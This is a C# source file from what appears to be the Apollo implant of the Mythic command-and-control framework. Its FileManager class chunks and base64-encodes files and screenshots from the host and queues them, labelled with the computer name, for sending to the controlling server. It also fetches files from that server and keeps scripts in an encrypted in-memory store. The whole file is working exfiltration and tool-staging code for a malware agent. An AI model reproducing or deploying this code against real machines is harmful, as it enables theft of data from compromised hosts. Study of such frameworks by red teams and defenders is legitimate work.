﻿using ApolloInterop.Classes.Core;
using ApolloInterop.Classes.Events;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using ApolloInterop.Classes.Cryptography;
using Newtonsoft.Json.Serialization;

namespace Apollo.Management.Files
{
    public sealed class FileManager : IFileManager
    {
        private int _chunkSize = 512000;
        private IAgent _agent;
        private IEncryptedFileStore _fileStore;

        public FileManager(IAgent agent)
        {
            _agent = agent;
            _fileStore = new EncryptedFileStore.EncryptedFileStore(
                new ICryptographicRoutine[]
                {
                    new AesRoutine(),
                    // In the future, we should allow composible encryption routines;
                    // however, due to how impersonation and DPAPI interact,
                    // we can't use DPAPI to encrypt files.
                    // new DpapiRoutine(System.Guid.NewGuid().ToByteArray()),
                });
        }

        internal struct UploadMessageTracker
        {
            internal AutoResetEvent Complete;
            internal ChunkedMessageStore<MythicTaskStatus> MessageStore;
            internal byte[] Data;
            private CancellationToken _ct;
            internal bool error;
            internal UploadMessageTracker(CancellationToken ct, bool initialState = false, ChunkedMessageStore<MythicTaskStatus> store = null, byte[] data = null)
            {
                _ct = ct;
                Complete = new AutoResetEvent(initialState);
                MessageStore = store == null ? new ChunkedMessageStore<MythicTaskStatus>() : store;
                Data = data;
                error = false;
            }
            internal void MarkError()
            {
                error = true;
            }
        }

        // Annoyingly, we need a separate struct as Download task responses don't have
        public class DownloadMessageTracker
        {
            public AutoResetEvent Complete = new AutoResetEvent(false);
            public List<MythicTaskStatus> Statuses = new List<MythicTaskStatus>();
            public event EventHandler<ChunkMessageEventArgs<MythicTaskStatus>> ChunkAdd;
            public event EventHandler<ChunkMessageEventArgs<MythicTaskStatus>> AllChunksSent;
            private CancellationToken _ct;
            public int TotalChunks { get; private set; }
            public string FilePath { get; private set; }
            public string Hostname { get; private set; }
            public int ChunkSize { get; private set; }
            public byte[][] Chunks { get; private set; }
            public int ChunksSent { get; private set; } = 0;
            public string FileID = "";
            private object _lock = new object();
            public bool IsScreenshot { get; private set; }
            internal DownloadMessageTracker(CancellationToken ct, byte[] data, int chunkSize, string filePath, string hostName = "", bool screenshot = false)
            {
                _ct = ct;
                TotalChunks = (int)Math.Ceiling((double)data.Length / (double)chunkSize);
                Chunks = new byte[TotalChunks][];
                for(int i = 0; i < TotalChunks; i++)
                {
                    Chunks[i] = data.Skip(i * chunkSize).Take(chunkSize).ToArray();
                }
                FilePath = filePath;
                Hostname = hostName;
                IsScreenshot = screenshot;
            }

            public void AddMessage(MythicTaskStatus t)
            {
                if (!string.IsNullOrEmpty(t.FileID) && string.IsNullOrEmpty(FileID))
                {
                    FileID = t.FileID;
                } else if (t.StatusMessage == "success")
                {
                    ChunksSent += 1;
                }
                Statuses.Add(t);
                if (ChunksSent == TotalChunks || t.StatusMessage == "error" || _ct.IsCancellationRequested)
                {
                    AllChunksSent?.Invoke(this, new ChunkMessageEventArgs<MythicTaskStatus>(new MythicTaskStatus[] { t }));
                    Complete.Set();
                } else
                {
                    ChunkAdd?.Invoke(this, new ChunkMessageEventArgs<MythicTaskStatus>(new MythicTaskStatus[]{ t }));
                }
            }
        }

        private ConcurrentDictionary<string, UploadMessageTracker> _uploadMessageStore = new ConcurrentDictionary<string, UploadMessageTracker>();
        private ConcurrentDictionary<string, DownloadMessageTracker> _downloadMessageStore = new ConcurrentDictionary<string, DownloadMessageTracker>();

        public string[] GetPendingTransfers()
        {
            return _uploadMessageStore.Keys.Concat(_downloadMessageStore.Keys).ToArray();
        }

        public void ProcessResponse(MythicTaskStatus resp)
        {
            if (_uploadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
            {
                // This is an upload message response, send it along.
                if (resp.ChunkNumber > 0 && _uploadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
                {
                    _uploadMessageStore[resp.ApolloTrackerUUID].MessageStore.AddMessage(resp);
                }
            } else
            {
                if (_downloadMessageStore.ContainsKey(resp.ApolloTrackerUUID))
                {
                    _downloadMessageStore[resp.ApolloTrackerUUID].AddMessage(resp);
                }
            }
        }

        private void FileManager_MessageComplete(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
        {
            List<byte> data = new List<byte>();
            for(int i = 0; i < e.Chunks.Length; i++)
            {
                data.AddRange(Convert.FromBase64String(e.Chunks[i].ChunkData));
            }
            if (_uploadMessageStore.TryGetValue(e.Chunks[0].ApolloTrackerUUID, out UploadMessageTracker tracker))
            {
                tracker.Data = data.ToArray();
                _uploadMessageStore[e.Chunks[0].ApolloTrackerUUID] = tracker;
                tracker.Complete.Set();
            }
        }

        public bool PutFile(CancellationToken ct, string taskID, byte[] content, string originatingPath, out string mythicFileId, bool isScreenshot = false, string originatingHost = null)
        {
            string uuid = Guid.NewGuid().ToString();
            lock (_downloadMessageStore)
            {
                if (string.IsNullOrEmpty(originatingHost))
                {
                    originatingHost = Environment.GetEnvironmentVariable("COMPUTERNAME");
                }
                _downloadMessageStore[uuid] = new DownloadMessageTracker(ct, content, _chunkSize, originatingPath, originatingHost, isScreenshot);
                _downloadMessageStore[uuid].ChunkAdd += DownloadChunkSent;
            }
            MythicTaskResponse resp = new MythicTaskResponse
            {
                TaskID = taskID,
                Download = new DownloadMessage
                {
                    TotalChunks = _downloadMessageStore[uuid].TotalChunks,
                    FullPath = originatingPath,
                    Hostname = originatingHost,
                    IsScreenshot = isScreenshot,
                    TaskID = taskID,
                },
                ApolloTrackerUUID = uuid
            };
            _agent.GetTaskManager()?.AddTaskResponseToQueue(resp);
            WaitHandle.WaitAny(new WaitHandle[]
            {
                _downloadMessageStore[uuid].Complete,
                ct.WaitHandle
            });
            _downloadMessageStore.TryRemove(uuid, out DownloadMessageTracker itemTracker);
            mythicFileId = itemTracker.FileID;
            return !ct.IsCancellationRequested && itemTracker.ChunksSent == itemTracker.TotalChunks;
        }

        public bool GetFile(CancellationToken ct, string taskID, string fileID, out byte[] fileBytes)
        {
            string uuid = Guid.NewGuid().ToString();
            lock(_uploadMessageStore)
            {
                if (!_uploadMessageStore.ContainsKey(taskID))
                {
                    _uploadMessageStore[uuid] = new UploadMessageTracker(ct, false);
                    _uploadMessageStore[uuid].MessageStore.ChunkAdd += MessageStore_ChunkAdd;
                    _uploadMessageStore[uuid].MessageStore.MessageComplete += FileManager_MessageComplete;
                }
            }
            _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
            {
                TaskID = taskID,
                Status = $"Fetching File Chunk 1...",
                Upload = new UploadMessage()
                {
                    TaskID = taskID,
                    FileID = fileID,
                    ChunkNumber = 1,
                    ChunkSize = _chunkSize
                },
                ApolloTrackerUUID = uuid
            });
            WaitHandle.WaitAny(new WaitHandle[]
            {
                _uploadMessageStore[uuid].Complete,
                ct.WaitHandle
            });
            bool bRet = false;
            if (_uploadMessageStore[uuid].Data != null && !_uploadMessageStore[uuid].error)
            {
                fileBytes = _uploadMessageStore[uuid].Data;
                bRet = true;
                _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
                {
                    TaskID = taskID,
                    Status = "Using file...",
                });
            } else
            {
                fileBytes = null;
                bRet = false;
            }
            _uploadMessageStore.TryRemove(uuid, out UploadMessageTracker _);

            return bRet;
        }

        private void MessageStore_ChunkAdd(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
        {
            MythicTaskStatus msg = e.Chunks[0];
            if(msg.StatusMessage != "success")
            {
                _uploadMessageStore[msg.ApolloTrackerUUID].MarkError();
                _uploadMessageStore[msg.ApolloTrackerUUID].Complete.Set();
                return;
            }
            _agent.GetTaskManager().AddTaskResponseToQueue(new MythicTaskResponse()
            {
                TaskID = msg.TaskID,
                Status = $"Fetching File Chunk {msg.ChunkNumber + 1} / {msg.TotalChunks}",
                Upload = new UploadMessage()
                {
                    TaskID = msg.TaskID,
                    FileID = msg.FileID,
                    ChunkNumber = msg.ChunkNumber + 1,
                    ChunkSize = _chunkSize
                },
                ApolloTrackerUUID = msg.ApolloTrackerUUID
            });
        }

        private void DownloadChunkSent(object sender, ChunkMessageEventArgs<MythicTaskStatus> e)
        {
            DownloadMessageTracker tracker = (DownloadMessageTracker)sender;
            var msg = new MythicTaskResponse()
                  {
                      TaskID = e.Chunks[0].TaskID,
                      Status = $"Transferring chunk {tracker.ChunksSent + 1} / {e.Chunks[0].TotalChunks}",
                      Download = new DownloadMessage
                      {
                          ChunkNumber = tracker.ChunksSent + 1,
                          FileID = tracker.FileID,
                          ChunkData = Convert.ToBase64String(tracker.Chunks[tracker.ChunksSent]),
                          TaskID = e.Chunks[0].TaskID
                      },
                      ApolloTrackerUUID = e.Chunks[0].ApolloTrackerUUID
                  };
            if(tracker.ChunksSent == 1){
                msg.UserOutput = $"{{\"file_id\": \"{tracker.FileID}\"}}";
            }
            _agent.GetTaskManager().AddTaskResponseToQueue(msg);
        }

        public string GetScript()
        {
            return _fileStore.GetScript();
        }

        public void SetScript(string script)
        {
            _fileStore.SetScript(script);
        }

        public bool AddFileToStore(string keyName, byte[] data)
        {
            return _fileStore.TryAddOrUpdate(keyName, data);
        }

        public bool GetFileFromStore(string keyName, out byte[] data)
        {
            return _fileStore.TryGetValue(keyName, out data);
        }

        public void SetScript(byte[] script)
        {
            _fileStore.SetScript(script);
        }
    }
}
